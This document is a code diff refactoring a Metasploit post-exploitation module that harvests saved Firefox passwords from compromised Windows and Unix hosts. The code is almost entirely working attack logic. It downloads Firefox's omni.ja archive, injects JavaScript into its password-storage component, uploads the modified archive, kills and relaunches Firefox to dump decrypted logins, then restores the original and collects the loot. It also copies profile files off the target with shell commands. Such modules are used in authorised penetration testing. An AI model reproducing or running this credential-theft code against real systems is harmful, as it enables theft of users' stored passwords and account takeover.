@@ -58,15 +58,13 @@ class Metasploit3 < Msf::Post
     ))
 
     register_options([
-      OptBool.new('DECRYPT',
-        [false, 'Decrypts passwords without third party tools', false])
+      OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])
     ], self.class)
 
     register_advanced_options([
-      OptBool.new('DISCLAIMER',
-        [false, 'Acknowledge the DECRYPT warning', false]),
-      OptBool.new('RECOVER',
-        [false, 'Attempt to recover from bad DECRYPT when possible', false])
+      OptInt.new('DOWNLOAD_TIMEOUT', [true, 'Timeout to wait when downloading files through shell sessions', 20]),
+      OptBool.new('DISCLAIMER', [false, 'Acknowledge the DECRYPT warning', false]),
+      OptBool.new('RECOVER',  [false, 'Attempt to recover from bad DECRYPT when possible', false])
     ], self.class)
   end
 
@@ -91,89 +89,7 @@ class Metasploit3 < Msf::Post
     end
 
     if datastore['DECRYPT']
-      if !datastore['DISCLAIMER']
-        decrypt_disclaimer
-        return
-      end
-
-      omnija = nil             # non meterpreter download
-      org_file = 'omni.ja'     # key file
-      new_file = Rex::Text::rand_text_alpha(5 + rand(3)) + ".ja"
-      temp_file = "orgomni.ja" # backup of key file     #Rex::Text::rand_text_alpha(5 + rand(3)) + ".ja"
-
-      # Sets @paths
-      return unless decrypt_get_env
-
-      # Check target for the necessary files
-      if session.type == "meterpreter"
-      if session.fs.file.exists?(@paths['ff'] + temp_file) and !session.fs.file.exists?(@paths['ff'] + org_file)
-        print_error("Detected #{temp_file} without #{org_file}. This is a good sign of previous DECRYPT attack gone wrong.")
-        return
-      elsif session.fs.file.exists?(@paths['ff'] + temp_file)
-        decrypt_file_stats(temp_file, org_file, @paths['ff'])
-        if !datastore['RECOVER']
-          print_warning("If you wish to continue by trying to recover, set the advanced option, RECOVER, to TRUE.")
-          print_line
-          return
-        else
-          return unless decrypt_recover_omni(temp_file, org_file, @paths['ff'])
-        end
-      elsif !session.fs.file.exists?(@paths['ff'] + org_file)
-        print_error("Could not download #{org_file}. File does not exist.")
-        return
-      end
-      end # session.type == "meterpreter"
-
-      session.type == "meterpreter" ? (size = "(%s MB)" % "%0.2f" % (session.fs.file.stat(@paths['ff'] + org_file).size / 1048576.0)) : (size = "")
-      tmp = Dir::tmpdir + "/" + new_file          # Cross platform local tempdir, "/" should work on Windows too
-      print_status("Downloading #{@paths['ff'] + org_file} to: #{tmp} %s" % size)
-
-      if session.type == "meterpreter"            # If meterpreter is an option, lets use it!
-        session.fs.file.download_file(tmp, @paths['ff'] + org_file)
-      else                                        # Fall back shells
-        omnija = read_file(@paths['ff'] + org_file)
-        if omnija.nil? or omnija.empty? or omnija =~ /No such file/i
-          print_error("Could not download: #{@paths['ff'] + org_file}")
-          print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading)") if session.type != "meterpreter"
-          return
-        end
-
-        print_status("Saving #{org_file} to: #{tmp}")
-        file_local_write(tmp, omnija)
-      end
-
-      res = nil
-      print_status("Injecting into: #{tmp}")
-      begin
-        # Automatically commits the changes made to the zip archive when the block terminates
-        Zip::File.open(tmp) do |zip_file|
-          res = decrypt_modify_omnija(zip_file)
-        end
-      rescue Zip::Error => e
-        print_error("Error modifying: #{tmp}")
-        return
-      end
-      if res
-        vprint_good("Successfully modified: #{tmp}")
-      else
-        print_error("Failed to inject")
-        return
-      end
-
-      print_status("Uploading #{tmp} to: #{@paths['ff'] + new_file}")
-      print_warning("This may take some time...") if @platform =~ /unix|osx/
-      if session.type == "meterpreter"
-        session.fs.file.upload_file(@paths['ff'] + new_file, tmp)
-      else
-        if !upload_file(@paths['ff'] + new_file, tmp)
-          print_error("Could not upload: #{tmp}")
-          return
-        end
-      end
-
-      return if !decrypt_trigger_decrypt(org_file, new_file, temp_file)
-
-      decrypt_download_creds
+      do_decrypt
     else  # Non DECRYPT
       paths = []
       paths = enum_users
@@ -185,9 +101,94 @@ class Metasploit3 < Msf::Post
 
       download_loot(paths.flatten)
     end
-    print_line
   end
 
+  def do_decrypt
+    unless datastore['DISCLAIMER']
+      decrypt_disclaimer
+      return
+    end
+
+    omnija = nil             # non meterpreter download
+    org_file = 'omni.ja'     # key file
+    new_file = Rex::Text::rand_text_alpha(5 + rand(3)) + ".ja"
+    temp_file = "orgomni.ja" # backup of key file
+
+    # Sets @paths
+    return unless decrypt_get_env
+
+    # Check target for the necessary files
+    if session.type == "meterpreter"
+      if session.fs.file.exists?(@paths['ff'] + temp_file) && !session.fs.file.exists?(@paths['ff'] + org_file)
+        print_error("Detected #{temp_file} without #{org_file}. This is a good sign of previous DECRYPT attack gone wrong.")
+        return
+      elsif session.fs.file.exists?(@paths['ff'] + temp_file)
+        decrypt_file_stats(temp_file, org_file, @paths['ff'])
+        if datastore['RECOVER']
+          return unless decrypt_recover_omni(temp_file, org_file)
+        else
+          print_warning("If you wish to continue by trying to recover, set the advanced option, RECOVER, to TRUE.")
+          return
+        end
+      elsif !session.fs.file.exists?(@paths['ff'] + org_file)
+        print_error("Could not download #{org_file}. File does not exist.")
+        return
+      end
+    end # session.type == "meterpreter"
+
+    session.type == "meterpreter" ? (size = "(%s MB)" % "%0.2f" % (session.fs.file.stat(@paths['ff'] + org_file).size / 1048576.0)) : (size = "")
+    tmp = Dir::tmpdir + "/" + new_file          # Cross platform local tempdir, "/" should work on Windows too
+    print_status("Downloading #{@paths['ff'] + org_file} to: #{tmp} %s" % size)
+
+    if session.type == "meterpreter"            # If meterpreter is an option, lets use it!
+      session.fs.file.download_file(tmp, @paths['ff'] + org_file)
+    else                                        # Fall back shells
+      omnija = read_file(@paths['ff'] + org_file)
+      if omnija.nil? or omnija.empty? or omnija =~ /No such file/i
+        print_error("Could not download: #{@paths['ff'] + org_file}")
+        print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading)") if session.type != "meterpreter"
+        return
+      end
+
+      print_status("Saving #{org_file} to: #{tmp}")
+      file_local_write(tmp, omnija)
+    end
+
+    res = nil
+    print_status("Injecting into: #{tmp}")
+    begin
+      # Automatically commits the changes made to the zip archive when the block terminates
+      Zip::File.open(tmp) do |zip_file|
+        res = decrypt_modify_omnija(zip_file)
+      end
+    rescue Zip::Error => e
+      print_error("Error modifying: #{tmp}")
+      return
+    end
+
+    if res
+      vprint_good("Successfully modified: #{tmp}")
+    else
+      print_error("Failed to inject")
+      return
+    end
+
+    print_status("Uploading #{tmp} to: #{@paths['ff'] + new_file}")
+    print_warning("This may take some time...") if @platform =~ /unix|osx/
+
+    if session.type == "meterpreter"
+      session.fs.file.upload_file(@paths['ff'] + new_file, tmp)
+    else
+      unless upload_file(@paths['ff'] + new_file, tmp)
+        print_error("Could not upload: #{tmp}")
+        return
+      end
+    end
+
+    return unless decrypt_trigger_decrypt(org_file, new_file, temp_file)
+
+    decrypt_download_creds
+  end
 
   def decrypt_disclaimer
     print_line
@@ -209,22 +210,21 @@ class Metasploit3 < Msf::Post
   end
 
 
-  def decrypt_recover_omni(temp_file, org_file, path)
-    #print_status("Deleting: #{@paths['ff'] + temp_file} (Possible backup)")
-    #file_rm(@paths['ff'] + temp_file)
+  def decrypt_recover_omni(temp_file, org_file)
     print_status("Restoring: #{@paths['ff'] + temp_file} (Possible backup)")
     file_rm(@paths['ff'] + org_file)
     rename_file(@paths['ff'] + temp_file, @paths['ff'] + org_file)
 
     if session.type == "meterpreter"
-    print_error("There is still #{temp_file} on the target. Something went wrong.") if session.fs.file.exists?(@paths['ff'] + temp_file)
+      print_error("There is still #{temp_file} on the target. Something went wrong.") if session.fs.file.exists?(@paths['ff'] + temp_file)
 
-    if !session.fs.file.exists?(@paths['ff'] + org_file)
-      print_error("#{org_file} is no longer at #{@paths['ff'] + org_file}")
-      return false
-    end
+      unless session.fs.file.exists?(@paths['ff'] + org_file)
+        print_error("#{org_file} is no longer at #{@paths['ff'] + org_file}")
+        return false
+      end
     end # session.type == "meterpreter"
-    return true
+
+    true
   end
 
 
@@ -343,11 +343,16 @@ class Metasploit3 < Msf::Post
           if @platform == :windows
             p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, "firefox_#{file}")
             session.fs.file.download_file(p, path + "\\" + file)
+            print_good("Downloaded #{file}: #{p.to_s}")
           else   # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)
-            loot = cmd_exec("cat #{path}//#{file}")
-            p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
+            loot = cmd_exec("cat #{path}//#{file}", nil, datastore['DOWNLOAD_TIMEOUT'])
+            if loot.nil? || loot.empty?
+              print_error("Failed to download #{file}, if the file is very long, try increasing DOWNLOAD_TIMEOUT")
+            else
+              p = store_loot("ff.#{profile}.#{file}", "#{mime}/#{ext}", session, loot, "firefox_#{file}", "#{file} for #{profile}")
+              print_good("Downloaded #{file}: #{p.to_s}")
+            end
           end
-          print_good("Downloaded #{file}: #{p.to_s}")
         end
       end
       print_line
@@ -355,7 +360,7 @@ class Metasploit3 < Msf::Post
   end
 
 
-  # Checks for needed privileges and wheter Firefox is installed
+  # Checks for needed privileges and if Firefox is installed
   def decrypt_get_env
     @paths = {}
     check_paths = []
@@ -363,7 +368,7 @@ class Metasploit3 < Msf::Post
 
     case @platform
     when /win/
-      if !got_root and session.sys.config.sysinfo['OS'] !~ /xp/i
+      unless got_root || session.sys.config.sysinfo['OS'] =~ /xp/i
         print_warning("You may need SYSTEM privileges on this platform for the DECRYPT option to work")
       end
 
@@ -375,7 +380,7 @@ class Metasploit3 < Msf::Post
       check_paths << drive + '\\Program Files\\Mozilla Firefox\\'
       check_paths << drive + '\\Program Files (x86)\\Mozilla Firefox\\'
     when /unix/
-      if !got_root
+      unless got_root
         print_error("You need ROOT privileges on this platform for DECRYPT option")
         return false
       end
@@ -403,7 +408,6 @@ class Metasploit3 < Msf::Post
         print_good("Found Firefox directory: #{check}")
         true
       else
-        #vprint_error("No Firefox directory found")
         false
       end
     end
@@ -414,18 +418,19 @@ class Metasploit3 < Msf::Post
     end
 
     @paths['loot'] = tmpdir + loot_file
-    return true
+
+    true
   end
 
 
   def decrypt_modify_omnija(zip)
     # Which files to extract from ja/zip
     files = [
-              'components/storage-mozStorage.js',                        # stor_js
-              'chrome/toolkit/content/passwordmgr/passwordManager.xul',  # pwd_xul
-              'chrome/toolkit/content/global/commonDialog.xul',          # dlog_xul
-              'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)
-            ]
+      'components/storage-mozStorage.js',                        # stor_js
+      'chrome/toolkit/content/passwordmgr/passwordManager.xul',  # pwd_xul
+      'chrome/toolkit/content/global/commonDialog.xul',          # dlog_xul
+      'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)
+    ]
 
     # Extract files from zip
     arya = files.map do |omnija_file|
@@ -501,21 +506,21 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 |
 
     regex = [
-              nil, # dirty hack alert
-              [/return\slogins;/, method_epilog],
-              [/Components\.utils\.import\("resource:\/\/gre\/modules\/XPCOMUtils\.jsm"\);/, imports]
-            ]
+      nil, # dirty hack alert
+      [/return\slogins;/, method_epilog],
+      [/Components\.utils\.import\("resource:\/\/gre\/modules\/XPCOMUtils\.jsm"\);/, imports]
+    ]
 
     # Match the last two regular expressions
     i = 2 # ...this is todo with the nil in the above regex array & regex command below
     x = i
     stor_js['content'].each_line do |line|
       # There is no real substitution if the matching regex has no corresponding patch code
-      if i != 0 and line.sub!(regex[i][0]) do |match|
-          if !regex[i][1].nil?
-            vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
-            regex[i][1]
-          end
+      if i != 0 && line.sub!(regex[i][0]) do |match|
+        if regex[i][1]
+          vprint_good("[#{x-i+1}/#{x}] Javascript injected - ./components/storage-mozStorage.js")
+          regex[i][1]
+        end
       end # do |match|
       i -= 1
       end # if i != 0
@@ -550,7 +555,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
         print_error("No normal user found")
         return false
       end
-      user = users.split()[0]
+      user = users.split[0]
       # Since we can't access the display environment variable we have to assume the default value
       args.insert(0, "\"#{@paths['ff']}firefox --display=:0 ")
       args << "\""
@@ -566,7 +571,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       session.sys.process.each_process do |p|
         if p['name'] =~ /firefox\.exe/
           print_status("Found running Firefox process, attempting to kill.")
-          if !session.sys.process.kill(p['pid'])
+          unless session.sys.process.kill(p['pid'])
             print_error("Could not kill Firefox process")
             return false
           end
@@ -577,7 +582,7 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
       if p =~ /firefox/
         print_status("Found running Firefox process, attempting to kill.")
         term = cmd_exec("killall", "firefox && echo true")
-        if !term =~ /true/
+        if term !~ /true/
           print_error("Could not kill Firefox process")
           return false
         end
@@ -599,19 +604,19 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 
     # Automatic termination (window.close() - injected XUL or firefox cmd arguments)
     print_status("Starting Firefox process to get #{whoami}'s credentials")
-    cmd_exec(cmd,args)
+    cmd_exec(cmd, args)
     sleep(1)
 
     # Lets just check theres something before going forward
     if session.type == "meterpreter"
-    i=20
-    vprint_status("Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated") if !session.fs.file.exists?(@paths['loot'])
-    while (!session.fs.file.exists?(@paths['loot']))
-      sleep 1
-      i -= 1
-      break if i == 0
-    end
-    print_error("Missing loot file. Something went wrong.") if !session.fs.file.exists?(@paths['loot'])
+      i=20
+      vprint_status("Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated") unless session.fs.file.exists?(@paths['loot'])
+      while (!session.fs.file.exists?(@paths['loot']))
+        sleep 1
+        i -= 1
+        break if i == 0
+      end
+      print_error("Missing loot file. Something went wrong.") unless session.fs.file.exists?(@paths['loot'])
     end # session.type == "meterpreter"
 
     print_status("Restoring original .JA: #{temp_file}")
@@ -622,23 +627,25 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
     vprint_status("Cleaning up: #{new_file}")
     file_rm(new_file)
     if session.type == "meterpreter"
-    if session.fs.file.exists?(temp_file)
-      print_error("Detected backup file (#{temp_file}) still on the target. Something went wrong.")
-    end
-    if !session.fs.file.exists?(org_file)
-      print_error("Unable to find #{org_file} on target. Something went wrong.")
-    end
+      if session.fs.file.exists?(temp_file)
+        print_error("Detected backup file (#{temp_file}) still on the target. Something went wrong.")
+      end
+      unless session.fs.file.exists?(org_file)
+        print_error("Unable to find #{org_file} on target. Something went wrong.")
+      end
     end # session.type == "meterpreter"
 
     # At this time, there should have a loot file
-    if !session.fs.file.exists?(@paths['loot']) and session.type == "meterpreter"
-      print_error("DECRYPT failed. Either something went wrong (download/upload? Injecting?), there is a master password or an unsupported Firefox version.")
-      # Another issue is encoding. The files may be seen as 'data' rather than 'ascii'
-      print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading/uploading)") if session.type != "meterpreter"
-      return false
+    if session.type == "meterpreter"
+      unless session.fs.file.exists?(@paths['loot'])
+        print_error("DECRYPT failed. Either something went wrong (download/upload? Injecting?), there is a master password or an unsupported Firefox version.")
+        # Another issue is encoding. The files may be seen as 'data' rather than 'ascii'
+        print_error("Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading/uploading)") if session.type != "meterpreter"
+        return false
+      end
     end
 
-    return true
+    true
   end
 
 
@@ -717,6 +724,12 @@ Components.utils.import("resource://gre/modules/XPCOMUtils.jsm");
 
 
   def whoami
-    @platform == :windows ? (session.sys.config.getenv('USERNAME')) : (cmd_exec("whoami").chomp)
+    if @platform == :windows
+      id = session.sys.config.getenv('USERNAME')
+    else
+      id = cmd_exec("id -un")
+    end
+
+    id
   end
 end
